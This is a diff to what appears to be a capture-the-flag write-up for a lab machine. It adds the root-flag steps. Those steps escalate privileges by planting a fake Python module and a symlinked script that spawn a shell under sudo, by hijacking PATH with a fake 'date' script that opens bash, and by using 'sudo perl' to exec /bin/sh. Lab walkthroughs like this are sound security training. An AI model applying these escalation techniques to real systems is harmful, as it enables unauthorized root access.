@@ -137,6 +137,48 @@ We do a `ls` and we found a file `user.txt`.
 
 ### Root Flag
 
+The script `toss-a-coin.oy` import `random` volume. We can create a `random` fake module who will execute the code we want.
+
+```bash
+echo 'import os; os.system("/bin/bash")' > /home/jaskier/random.py
+
+sudo -u yen /usr/bin/python3.6 -c 'import sys; sys.path.insert(0, "/home/jaskier"); import toss-a-coin'
+Sorry, user jaskier is not allowed to execute '/usr/bin/python3.6 -c import sys; sys.path.insert(0, "/home/jaskier"); import toss-a-coin' as yen on the-continent.
 ```
-### TO DO
+
 ```
+echo 'import os; os.system("/bin/bash")' > /home/jaskier/get_root.py
+ln -s /home/jaskier/get_root.py /home/jaskier/toss-a-coin.py
+sudo -u yen /usr/bin/python3.6 /home/jaskier/toss-a-coin.py
+```
+
+Go to geralt with yen user
+Modify the `portal` file of `yen` with replace the var `date` with a PATH
+
+We need to create a file `date`
+```bash 
+#!/bin/bash 
+/bin/bash -i
+```
+
+We have to be sure PATH is execute in first. 
+
+```bash
+export PATH=/home/jaskier/scripts:$PATH
+```
+
+We have to verify the PATH is correct. 
+
+```bash
+which date
+export PATH=/home/jaskier/scripts:$PATH
+```
+
+We are `geralt` user.
+
+```bash
+sudo perl -e 'exec "/bin/sh";'
+sudo -i
+```
+
+**Well done! You have successfully completed the room.**
